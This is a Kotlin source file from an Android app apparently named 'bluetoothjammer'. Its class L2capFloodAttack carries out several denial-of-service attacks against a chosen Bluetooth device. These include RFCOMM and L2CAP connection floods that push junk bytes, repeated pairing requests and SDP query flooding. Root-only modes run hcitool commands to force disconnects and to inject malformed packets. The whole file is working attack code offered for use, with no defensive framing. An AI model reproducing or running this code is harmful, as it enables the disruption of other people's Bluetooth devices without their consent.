package api

import android.annotation.SuppressLint
import android.bluetooth.BluetoothAdapter
import android.bluetooth.BluetoothDevice
import android.bluetooth.BluetoothManager
import android.bluetooth.BluetoothSocket
import android.content.Context
import android.os.Build
import android.widget.TextView
import androidx.annotation.RequiresApi
import androidx.core.content.ContextCompat.getSystemService
import com.eikarna.bluetoothjammer.AttackActivity
import com.google.android.material.textview.MaterialTextView
import kotlinx.coroutines.*
import java.io.IOException
import java.util.*
import util.Logger
import util.RootUtils

class L2capFloodAttack(private val targetAddress: String, private val attackMode: AttackMode = AttackMode.MULTI_VECTOR) {
    private var bluetoothAdapter: BluetoothAdapter? = null
    private var l2capSocket: BluetoothSocket? = null
    private var coroutineScope: CoroutineScope? = null

    // Purge oldest messages if the line count exceeds 100
    private fun purgeOldestMessagesIfNeeded(element: TextView) {
        val maxLines = 100
        val lines = element.text.split("\n")
        if (lines.size > maxLines) {
            val newText = lines.takeLast(maxLines).joinToString("\n")
            element.text = newText
        }
    }

    @RequiresApi(Build.VERSION_CODES.Q)
    @SuppressLint("MissingPermission")
    fun startAttack(context: Context, element: MaterialTextView, threadId: Int = 0, delayMs: Long = 0) {
        coroutineScope = CoroutineScope(Dispatchers.IO)
        val bluetoothManager: BluetoothManager? = getSystemService(context, BluetoothManager::class.java)
        bluetoothAdapter = bluetoothManager?.adapter
        val device: BluetoothDevice? = bluetoothAdapter?.getRemoteDevice(targetAddress)

        if (device != null) {
            coroutineScope!!.launch {
                // Add delay between thread starts
                if (delayMs > 0) {
                    delay(delayMs)
                }
                
                // Use different base UUIDs for different threads
                val baseUUIDs = listOf(
                    "00001105-0000-1000-8000-00805F9B34FB", // OPP
                    "00001101-0000-1000-8000-00805F9B34FB", // SPP
                    "0000110A-0000-1000-8000-00805F9B34FB", // A2DP
                    "0000110B-0000-1000-8000-00805F9B34FB", // Audio Sink
                    "0000110C-0000-1000-8000-00805F9B34FB", // A/V Remote Control
                    "0000110E-0000-1000-8000-00805F9B34FB", // A/V Remote Control
                    "00001112-0000-1000-8000-00805F9B34FB", // Headset Audio Gateway
                    "0000111F-0000-1000-8000-00805F9B34FB"  // Handsfree Audio Gateway
                )
                
                if (AttackActivity.loggingStatus) {
                    (context as AttackActivity).runOnUiThread {
                        Logger.appendLog(element, "Thread $threadId: Starting ${attackMode.displayName}...")
                        Logger.appendLog(element, "Mode: ${attackMode.description}")
                    }
                }
                
                // Execute attack based on selected mode
                when (attackMode) {
                    AttackMode.CONNECTION_BOMBARDMENT -> connectionBombardment(device, context, element, threadId, baseUUIDs)
                    AttackMode.PAIRING_SPAM -> pairingSpam(device, context, element, threadId)
                    AttackMode.SDP_FLOODING -> sdpFlooding(device, context, element, threadId)
                    AttackMode.RFCOMM_FLOOD -> rfcommFlood(device, context, element, threadId, baseUUIDs)
                    AttackMode.L2CAP_ATTACK -> l2capAttack(device, context, element, threadId)
                    AttackMode.MULTI_VECTOR -> multiVectorAttack(device, context, element, threadId, baseUUIDs)
                    AttackMode.ROOT_DEAUTH -> rootDeauthAttack(device, context, element, threadId)
                    AttackMode.ROOT_STACK_POISON -> rootStackPoison(device, context, element, threadId)
                }
            }
        }
    }
    
    @SuppressLint("MissingPermission")
    private suspend fun connectionBombardment(device: BluetoothDevice, context: Context, element: MaterialTextView, threadId: Int, baseUUIDs: List<String>) {
        var attemptCount = 0
        var successCount = 0
        
        while (AttackActivity.isAttacking) {
            attemptCount++
            try {
                val channel = (attemptCount % 30) + 1
                val uuid = baseUUIDs[attemptCount % baseUUIDs.size]
                
                val socket = try {
                    val method = device.javaClass.getMethod("createRfcommSocket", Int::class.javaPrimitiveType)
                    method.invoke(device, channel) as BluetoothSocket
                } catch (e: Exception) {
                    device.createInsecureRfcommSocketToServiceRecord(UUID.fromString(uuid))
                }
                
                try {
                    withTimeout(500) { socket.connect() }
                    if (socket.isConnected) {
                        successCount++
                        socket.outputStream?.write(ByteArray(990) { 0xFF.toByte() })
                        socket.close()
                        
                        if (successCount % 10 == 0 && AttackActivity.loggingStatus) {
                            (context as AttackActivity).runOnUiThread {
                                purgeOldestMessagesIfNeeded(element)
                                Logger.appendLog(element, "Thread $threadId: $successCount successful bombardments")
                            }
                        }
                    }
                } catch (e: Exception) {
                    try { socket.close() } catch (ex: Exception) { }
                }
                delay(30)
            } catch (e: Exception) { }
        }
    }
    
    @SuppressLint("MissingPermission")
    private suspend fun pairingSpam(device: BluetoothDevice, context: Context, element: MaterialTextView, threadId: Int) {
        var pairingAttempts = 0
        
        while (AttackActivity.isAttacking) {
            try {
                device.fetchUuidsWithSdp()
                if (device.bondState != BluetoothDevice.BOND_BONDED) {
                    device.createBond()
                    pairingAttempts++
                    
                    if (pairingAttempts % 20 == 0 && AttackActivity.loggingStatus) {
                        (context as AttackActivity).runOnUiThread {
                            purgeOldestMessagesIfNeeded(element)
                            Logger.appendLog(element, "Thread $threadId: $pairingAttempts pairing requests sent")
                        }
                    }
                }
                delay(100)
            } catch (e: Exception) { }
        }
    }
    
    @SuppressLint("MissingPermission")
    private suspend fun sdpFlooding(device: BluetoothDevice, context: Context, element: MaterialTextView, threadId: Int) {
        var sdpQueries = 0
        
        while (AttackActivity.isAttacking) {
            try {
                device.fetchUuidsWithSdp()
                sdpQueries++
                
                if (sdpQueries % 50 == 0 && AttackActivity.loggingStatus) {
                    (context as AttackActivity).runOnUiThread {
                        purgeOldestMessagesIfNeeded(element)
                        Logger.appendLog(element, "Thread $threadId: $sdpQueries SDP queries sent")
                    }
                }
                delay(50)
            } catch (e: Exception) { }
        }
    }
    
    @SuppressLint("MissingPermission")
    private suspend fun rfcommFlood(device: BluetoothDevice, context: Context, element: MaterialTextView, threadId: Int, baseUUIDs: List<String>) {
        var successCount = 0
        
        for (channel in 1..30) {
            if (!AttackActivity.isAttacking) break
            
            try {
                val method = device.javaClass.getMethod("createRfcommSocket", Int::class.javaPrimitiveType)
                val socket = method.invoke(device, channel) as BluetoothSocket
                
                try {
                    withTimeout(500) { socket.connect() }
                    if (socket.isConnected) {
                        successCount++
                        (context as AttackActivity).runOnUiThread {
                            Logger.appendLog(element, "Thread $threadId: Connected to channel $channel")
                        }
                        
                        // Keep connection alive and flood
                        while (AttackActivity.isAttacking && socket.isConnected) {
                            socket.outputStream?.write(ByteArray(990) { 0xFF.toByte() })
                            socket.outputStream?.flush()
                            delay(10)
                        }
                        socket.close()
                    }
                } catch (e: Exception) {
                    try { socket.close() } catch (ex: Exception) { }
                }
            } catch (e: Exception) { }
        }
    }
    
    @RequiresApi(Build.VERSION_CODES.Q)
    @SuppressLint("MissingPermission")
    private suspend fun l2capAttack(device: BluetoothDevice, context: Context, element: MaterialTextView, threadId: Int) {
        var successCount = 0
        
        for (psm in 1..50) {
            if (!AttackActivity.isAttacking) break
            
            try {
                val socket = device.createInsecureL2capChannel(psm)
                try {
                    withTimeout(500) { socket.connect() }
                    if (socket.isConnected) {
                        successCount++
                        (context as AttackActivity).runOnUiThread {
                            Logger.appendLog(element, "Thread $threadId: L2CAP PSM $psm connected")
                        }
                        socket.close()
                    }
                } catch (e: Exception) {
                    try { socket.close() } catch (ex: Exception) { }
                }
            } catch (e: Exception) { }
            delay(50)
        }
    }
    
    @RequiresApi(Build.VERSION_CODES.Q)
    @SuppressLint("MissingPermission")
    private suspend fun multiVectorAttack(device: BluetoothDevice, context: Context, element: MaterialTextView, threadId: Int, baseUUIDs: List<String>) {
        var attemptCount = 0
        var successCount = 0
        var pairingAttempts = 0
        
        while (AttackActivity.isAttacking) {
            attemptCount++
            
            try {
                // Strategy 1: SDP Service Discovery Spam (every 5th attempt)
                if (attemptCount % 5 == 0) {
                    try {
                        device.fetchUuidsWithSdp()
                    } catch (e: Exception) { }
                }
                
                // Strategy 2: Create Pairing Requests (every 10th attempt)
                if (attemptCount % 10 == 0) {
                    try {
                        if (device.bondState != BluetoothDevice.BOND_BONDED) {
                            device.createBond()
                            pairingAttempts++
                        }
                    } catch (e: Exception) { }
                }
                
                // Strategy 3: Rapid RFCOMM connection attempts
                val channel = (attemptCount % 30) + 1
                val uuid = baseUUIDs[attemptCount % baseUUIDs.size]
                
                val socket = when (attemptCount % 4) {
                    0 -> {
                        try {
                            val method = device.javaClass.getMethod("createRfcommSocket", Int::class.javaPrimitiveType)
                            method.invoke(device, channel) as BluetoothSocket
                        } catch (e: Exception) {
                            device.createInsecureRfcommSocketToServiceRecord(UUID.fromString(uuid))
                        }
                    }
                    1 -> device.createInsecureRfcommSocketToServiceRecord(UUID.fromString(uuid))
                    2 -> device.createRfcommSocketToServiceRecord(UUID.fromString(uuid))
                    else -> {
                        try {
                            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                                device.createInsecureL2capChannel(channel)
                            } else {
                                device.createInsecureRfcommSocketToServiceRecord(UUID.fromString(uuid))
                            }
                        } catch (e: Exception) {
                            device.createInsecureRfcommSocketToServiceRecord(UUID.fromString(uuid))
                        }
                    }
                }
                
                try {
                    withTimeout(500) { socket.connect() }
                    
                    if (socket.isConnected) {
                        successCount++
                        
                        if (AttackActivity.loggingStatus && successCount % 5 == 0) {
                            (context as AttackActivity).runOnUiThread {
                                purgeOldestMessagesIfNeeded(element)
                                Logger.appendLog(element, "Thread $threadId: $successCount connections | $pairingAttempts pairing requests")
                            }
                        }
                        
                        try {
                            val output = socket.outputStream
                            val junkData = ByteArray(990) { 0xFF.toByte() }
                            repeat(50) {
                                output.write(junkData)
                                output.flush()
                            }
                        } catch (e: Exception) { }
                        
                        socket.close()
                    }
                } catch (e: Exception) {
                    try { socket.close() } catch (ex: Exception) { }
                }
                
                delay(30)
                
            } catch (e: Exception) {
                if (AttackActivity.loggingStatus && attemptCount % 200 == 0) {
                    (context as AttackActivity).runOnUiThread {
                        purgeOldestMessagesIfNeeded(element)
                        Logger.appendLog(element, "Thread $threadId: $attemptCount attempts | $successCount successful")
                    }
                }
            }
        }
    }
    
    // ROOT ATTACK METHODS
    @SuppressLint("MissingPermission")
    private suspend fun rootDeauthAttack(device: BluetoothDevice, context: Context, element: MaterialTextView, threadId: Int) {
        if (!RootUtils.isRooted()) {
            (context as AttackActivity).runOnUiThread {
                Logger.appendLog(element, "Thread $threadId: ⚠️ ROOT ACCESS REQUIRED!")
                Logger.appendLog(element, "This device is not rooted.")
            }
            return
        }
        
        if (!RootUtils.requestRootAccess()) {
            (context as AttackActivity).runOnUiThread {
                Logger.appendLog(element, "Thread $threadId: ⚠️ ROOT ACCESS DENIED!")
            }
            return
        }
        
        (context as AttackActivity).runOnUiThread {
            Logger.appendLog(element, "Thread $threadId: ✅ Root access granted")
            Logger.appendLog(element, "Thread $threadId: Starting deauth attack...")
        }
        
        var deauthCount = 0
        while (AttackActivity.isAttacking) {
            try {
                // Method 1: Force disconnect via HCI commands
                val hciCmd = "hcitool dc ${device.address}"
                RootUtils.executeRootCommand(hciCmd)
                
                // Method 2: Reset ACL connection
                val aclCmd = "hcitool cmd 0x01 0x0006 ${device.address.replace(":", " ")}"
                RootUtils.executeRootCommand(aclCmd)
                
                // Method 3: Disable/enable Bluetooth stack briefly
                if (deauthCount % 10 == 0) {
                    RootUtils.executeRootCommand("service call bluetooth_manager 8")
                    delay(100)
                    RootUtils.executeRootCommand("service call bluetooth_manager 6")
                }
                
                deauthCount++
                
                if (AttackActivity.loggingStatus && deauthCount % 20 == 0) {
                    (context as AttackActivity).runOnUiThread {
                        purgeOldestMessagesIfNeeded(element)
                        Logger.appendLog(element, "Thread $threadId: $deauthCount deauth attempts sent")
                    }
                }
                
                delay(500)
            } catch (e: Exception) {
                if (AttackActivity.loggingStatus) {
                    (context as AttackActivity).runOnUiThread {
                        Logger.appendLog(element, "Thread $threadId: Error - ${e.message}")
                    }
                }
            }
        }
    }
    
    @SuppressLint("MissingPermission")
    private suspend fun rootStackPoison(device: BluetoothDevice, context: Context, element: MaterialTextView, threadId: Int) {
        if (!RootUtils.isRooted()) {
            (context as AttackActivity).runOnUiThread {
                Logger.appendLog(element, "Thread $threadId: ⚠️ ROOT ACCESS REQUIRED!")
            }
            return
        }
        
        if (!RootUtils.requestRootAccess()) {
            (context as AttackActivity).runOnUiThread {
                Logger.appendLog(element, "Thread $threadId: ⚠️ ROOT ACCESS DENIED!")
            }
            return
        }
        
        (context as AttackActivity).runOnUiThread {
            Logger.appendLog(element, "Thread $threadId: ✅ Root access granted")
            Logger.appendLog(element, "Thread $threadId: Injecting malformed packets...")
        }
        
        var poisonCount = 0
        while (AttackActivity.isAttacking) {
            try {
                // Inject malformed L2CAP packets
                val macBytes = device.address.replace(":", " ")
                
                // Send invalid channel IDs
                RootUtils.executeRootCommand("hcitool cmd 0x02 0x0001 $macBytes 00 FF")
                
                // Send oversized packets
                RootUtils.executeRootCommand("hcitool cmd 0x02 0x0002 $macBytes FF FF")
                
                // Trigger stack errors
                RootUtils.executeRootCommand("hcitool cmd 0x01 0x0005 $macBytes")
                
                poisonCount++
                
                if (AttackActivity.loggingStatus && poisonCount % 10 == 0) {
                    (context as AttackActivity).runOnUiThread {
                        purgeOldestMessagesIfNeeded(element)
                        Logger.appendLog(element, "Thread $threadId: $poisonCount poison packets injected")
                    }
                }
                
                delay(100)
            } catch (e: Exception) {
                // Continue on error
            }
        }
    }

    @SuppressLint("MissingPermission")
    fun stopAttack() {
        AttackActivity.isAttacking = false
        coroutineScope?.cancel()
        coroutineScope = null
        closeConnection()
        l2capSocket = null
        bluetoothAdapter?.startDiscovery()
    }

    private fun closeConnection() {
        try {
            l2capSocket?.close()
        } catch (e: IOException) {
            e.printStackTrace()
        }
    }
}
